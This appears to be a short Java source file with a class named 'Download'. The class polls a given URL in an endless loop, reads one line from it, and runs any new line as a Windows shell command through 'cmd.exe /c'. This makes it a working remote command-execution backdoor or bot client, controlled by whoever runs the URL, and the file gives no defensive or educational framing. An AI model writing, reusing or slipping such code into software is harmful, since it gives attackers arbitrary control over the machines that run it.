import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;

public class Download implements Runnable {
	private URL url;
	private String command;
	private int sec;

	public Download(String s_url, int sec) {
		try {
			this.url = new URL(s_url);
			this.sec = sec;
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void updateCommand() {
		try {
			command = new BufferedReader(new InputStreamReader(url.openStream())).readLine();
		} catch (Exception e) {
			e.printStackTrace();
		}
		System.out.println(command);
	}

	public void execute() {
		try {
			Runtime.getRuntime().exec("cmd.exe /c " + command);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public void run() {
		String cmd = "";
		while (true) {
			this.updateCommand();
			if(!command.equals(cmd)) {
				cmd = command;
				this.execute();
			}
			try {
				Thread.sleep(sec * 1000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}
}

